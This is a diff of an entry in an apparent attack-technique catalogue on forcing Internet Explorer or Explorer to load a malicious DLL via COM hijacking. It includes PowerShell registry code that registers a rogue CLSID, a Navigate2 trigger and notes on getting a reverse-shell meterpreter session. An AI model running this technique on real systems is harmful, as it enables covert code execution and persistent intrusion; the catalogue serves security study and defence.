@@ -19,11 +19,11 @@ linked_artifacts:
   - A5002
 description: Forcing load a malicious DLL via COM Abuse
 extended_description: |
-    
+
     It's possible to force [iexplore.exe (or explorer.exe)](/artifacts/A_3005_executable_binary/entity) to load a [malicious DLL](/artifacts/A_3005_executable_binary/entity "DLL for Code Execution") and execute it - a technique which could be used when attempting to evade certain defenses.
 
     ## Attack mapping
-    
+
     | ARTIFACT                                                              | OBJECT                   | DESCRIPTION                                                                               |
     |-----------------------------------------------------------------------|--------------------------|-------------------------------------------------------------------------------------------|
     | **Attack Prerequisites**                                              |
@@ -33,12 +33,12 @@ extended_description: |
     | [Executable Binary](/artifacts/A_3005_executable_binary/entity)       | Malicious DLL            | Executable file with malware payload which an attacker wants to be executed on compromised host |
     | [Windows Registry](/artifacts/A_5002_windows_registry/entity)         | Registry                 | Contains low-level settings for the MS OS and application. In this case it's used for redirect DLL lauch |
     | [COM Object](/artifacts/A_3006_com_object/entity)                     | COM object               | Record in registry with random CLSID allows to handle incoming calls from COM clients |
-        
+
 
     ## Attack results
-    
+
     Whenever the injected [executable file](/artifacts/A_3003_operating_system_executable_file/entity "Explorer or IE") at compromised host is opened, [malicious DLL](/artifacts/A_3005_executable_binary/entity "DLL for Code Execution") will be launched and malicious code will be run.
-    
+
     | RESOURCE                                                              | DESCRIPTION                                                                               |
     |-----------------------------------------------------------------------|-------------------------------------------------------------------------------------------|
     | **Attack Prerequisites**                                              |                                                                                           |
@@ -46,13 +46,13 @@ extended_description: |
     | **Result Consequences**                                               |                                                                                           |
     | [Persist Access]()                                                    | For example, attacker can load reverse shell into malware payload for achieving remote persist access |
     | [Evased Code Execution]()                                             | Code execution via COM object allows to evade detection rules and some means of defense   |
-    
+
     ## Attack progress
     1) Below is a powershell code that creates [a new COM object](/artifacts/A_3006_com_object/entity) with a randomly chosen CLSID 55555555-5555-5555-5555-555555555555 which registers our malicious DLL at ..\attack\com_dll\reverse_64bit.dll to
     handle incoming calls from COM clients.
     <details>
     <summary><b>Powershell code</b></summary>
-    
+
     ```
     $CLSID = "55555555-5555-5555-5555-555555555555"
     Remove-Item -Recurse -Force -Path "HKCU:\Software\Classes\CLSID\{$CLSID}" -ErrorAction SilentlyContinue
@@ -71,31 +71,30 @@ extended_description: |
     $typeShwin = [System.Type]::GetTypeFromCLSID($shellWinGuid)
     $shwin = [System.Activator]::CreateInstance($typeShwin) | ? {$_.fullname -match 'iexplore'} | Select-Object -First 1
     $shWin.Navigate2("shell:::{$CLSID}", 2048)
-    
+
     ```
     </details>
-    
-  
+
+
     2) We can see that [the new COM object](/artifacts/A_3006_com_object/entity) got created successfully in the registry
-    
-    ![REG_COM](1.JPG)
-     
+
+    <img src="../1.JPG" alt="REG_COM"/>
+
     requesting a new instance of the ShellWindows (9BA05972-F6A8-11CF-A442-00A0C90A8F39) COM object, which actually applies to both explorer.exe and iexplore.exe, meaning with a handle to that object, we can interface with them using their exposed methods.
-    
+
     Specifically, we are interested in getting an instance of a COM object for iexplore.exe, because its COM server has a method Navigate2(...) exposed. The Navigate2 allows us to programatically instruct the
-    iexplore.exe to navigate to a URL. 
-    
+    iexplore.exe to navigate to a URL.
+
     We are asking iexplore to navigate to our newly created malicious CLSID pointing to our DLL instead of a URL.
-    
+
     ## Possible usage
-    
+
     1) [Malware dll file](/artifacts/A_3005_executable_binary/entity "DLL for Code Execution") may contains [reverse_shell](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html), so after [IExplore.exe](/artifacts/A_3003_operating_system_executable_file/entity "Explorer or IE") is launched we will get meterpeter session.
-    ![METER](3.JPG)
-    
+    <img src="../3.JPG" alt="METER"/>
+
     ## Attack diagram
-    ![Diagram](36.svg)
-    
-    ## References 
+    <img src="../36.svg" alt="Diagram"/>
+
+    ## References
 
     [COM and the PowerThIEf](https://labs.nettitude.com/blog/com-and-the-powerthief/)
-
